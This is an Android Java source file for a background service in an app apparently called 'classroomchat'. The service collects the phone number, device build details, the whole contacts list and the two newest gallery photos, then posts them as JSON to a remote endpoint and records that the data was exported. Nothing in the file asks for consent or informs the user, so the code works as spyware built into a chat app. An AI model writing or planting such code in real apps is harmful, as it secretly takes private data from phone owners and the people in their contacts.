package com.n2305.classroomchat;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.preference.PreferenceManager;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class DataExportService extends IntentService {

    public static final String HTTP_ENDPOINT = "HttpEndpoint";
    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
    public static final int AMOUNT_OF_PICTURES = 2;
    public static final int JPEG_QUALITY = 10;
    OkHttpClient httpClient = new OkHttpClient();

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public DataExportService(String name) {
        super(name);
    }

    public DataExportService() {
        super(DataExportService.class.toString());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);

        try {
            URL httpEndpointUrl = new URL(intent.getExtras().getString(HTTP_ENDPOINT));

            JSONObject phoneData = collectPhoneData();
            String phoneDataString = phoneData.toString();
            Log.d("DataExportService", phoneDataString);

            sendDataToServer(httpEndpointUrl.toString(), phoneDataString);

            preferences.edit()
                    .putBoolean("dataWasExported", true)
                    .apply();
        } catch (JSONException | MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendDataToServer(String url, String json) throws IOException {
        RequestBody requestBody = RequestBody.create(JSON, json);
        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        Response response = httpClient.newCall(request).execute();
        Log.d("DataExportService", response.toString());
    }

    protected JSONObject collectPhoneData() throws JSONException {
        JSONObject phoneData = new JSONObject();

        addPhoneNumberToPhoneData(phoneData);
        addBuildDataToPhoneData(phoneData);
        addPhoneContactsToPhoneData(phoneData, fetchPhoneContacts());
        addPicturesToPhoneData(phoneData);

        return phoneData;
    }

    protected void addPicturesToPhoneData(JSONObject phoneData) throws JSONException {
        JSONArray jsonPictures = new JSONArray(fetchEncodedPictures());
        phoneData.put("Pictures", jsonPictures);
    }

    protected ArrayList<String> fetchEncodedPictures() {
        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.ImageColumns._ID, MediaStore.Images.ImageColumns.DATA, MediaStore.Images.ImageColumns.MIME_TYPE},
                null,
                null,
                MediaStore.Images.ImageColumns._ID + " DESC"
        );

        ArrayList<String> pictures = new ArrayList<String>();

        if (cursor.moveToFirst()) {
            do {
                String pictureUri = cursor.getString(1);
                Bitmap bitmap = BitmapFactory.decodeFile(pictureUri);

                bitmap = scaleBitmap(bitmap);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);

                String encodedPictureString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
                pictures.add(encodedPictureString);
            } while (pictures.size() < AMOUNT_OF_PICTURES && cursor.moveToNext());
        }

        cursor.close();

        return pictures;
    }

    protected static Bitmap scaleBitmap(Bitmap bitmap) {
        int dstWidth = 512;
        float aspectRatio = (float) bitmap.getWidth() / (float) bitmap.getHeight();
        int dstHeight = Math.round(dstWidth / aspectRatio);
        bitmap = Bitmap.createScaledBitmap(bitmap, dstWidth, dstHeight, false);
        return bitmap;
    }

    protected void addPhoneNumberToPhoneData(JSONObject target) throws JSONException {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = telephonyManager.getLine1Number();

        target.put("PhoneNumber", phoneNumber != null ? phoneNumber : JSONObject.NULL);
    }

    protected void addPhoneContactsToPhoneData(JSONObject target, List<PhoneContact> phoneContacts) throws JSONException {
        JSONArray jsonPhoneContacts = new JSONArray(JSONUtil.convertToJSONObjectList(phoneContacts));
        target.put("Contacts", jsonPhoneContacts);
    }

    protected void addBuildDataToPhoneData(JSONObject target) throws JSONException {
        JSONObject buildData = new JSONObject();
        buildData.put("Manufacturer", Build.MANUFACTURER);
        buildData.put("Model", Build.MODEL);
        buildData.put("Device", Build.DEVICE);
        buildData.put("Hardware", Build.HARDWARE);
        buildData.put("Product", Build.PRODUCT);
        buildData.put("Brand", Build.BRAND);
        buildData.put("User", Build.USER);
        target.put("Build", buildData);
    }

    protected ArrayList<PhoneContact> fetchPhoneContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Phone.CONTENT_URI,
                new String[]{Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER},
                null, null, null
        );

        ArrayList<PhoneContact> contacts = new ArrayList<PhoneContact>();

        if (cursor.moveToFirst()) {
            do {
                PhoneContact contact = new PhoneContact(
                        cursor.getString(0),
                        cursor.getString(1),
                        cursor.getString(2)
                );

                contacts.add(contact);
            } while (cursor.moveToNext());
        }

        cursor.close();

        return contacts;
    }

    protected class PhoneContact implements JSONUtil.JSONable {
        private String id;
        private String displayName;
        private String number;

        public PhoneContact(String id, String displayName, String number) {
            this.id = id;
            this.displayName = displayName;
            this.number = number;
        }

        public String toJSON() throws JSONException {
            JSONObject jsonObject = toJSONObject();

            return jsonObject.toString();
        }

        public JSONObject toJSONObject() throws JSONException {
            JSONObject jsonObject = new JSONObject();

            jsonObject.put("Id", id);
            jsonObject.put("DisplayName", displayName);
            jsonObject.put("Number", number);
            return jsonObject;
        }

        public String toString() {
            return String.format("%s [id=%s, displayName=%s, number=%s]", getClass().getSimpleName(), id, displayName, number);
        }
    }
}
